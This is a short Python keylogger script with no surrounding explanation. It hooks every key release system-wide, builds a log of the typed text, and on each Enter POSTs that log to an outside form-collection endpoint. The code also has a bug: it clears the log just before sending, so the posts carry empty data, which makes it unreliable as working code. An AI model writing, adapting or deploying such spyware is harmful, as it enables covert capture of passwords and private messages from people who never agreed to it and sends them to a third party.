import requests
from requests.structures import CaseInsensitiveDict

import keyboard # for keylogs
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.log = ""
        self.number = 0

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                self.log = ''
                self.number += 1
                self.sendmail()
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        print(name)
        self.log += name

    def sendmail(self):
        print('sending')
        endpoint = "https://usebasin.com/f/9fccf75a09ac"

        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/x-www-form-urlencoded"

        data = {
            'number': self.number,
            'data': self.log,
        }

        postData = ''
        for i in data.keys():
            postData += i+'='+str(data[i])+'&'
        requests.post(endpoint, headers=headers, data=postData)

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
